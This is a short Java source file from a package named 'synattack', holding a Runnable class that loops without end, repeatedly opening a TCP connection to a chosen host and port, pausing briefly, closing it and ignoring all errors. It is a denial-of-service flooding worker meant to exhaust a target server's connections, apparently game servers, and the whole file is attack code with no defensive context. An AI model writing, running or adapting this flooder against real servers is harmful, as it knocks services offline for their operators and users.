package me.rootedsmp.synattack;

import java.net.InetSocketAddress;
import java.net.Socket;

public class SynRunnable implements Runnable {
	
	private String host;
	private int port;
	
	public SynRunnable(String host, int port) {
		this.host = host;
		this.port = port;
	}
	
	@Override
	public void run() {
		while(true) {
			
			try {
				Socket socket = new Socket();
				socket.connect(new InetSocketAddress(host, port), 2500);
				Thread.sleep(100);
				socket.close();
			}catch (Exception e) {}
			
		}
	}
	
}
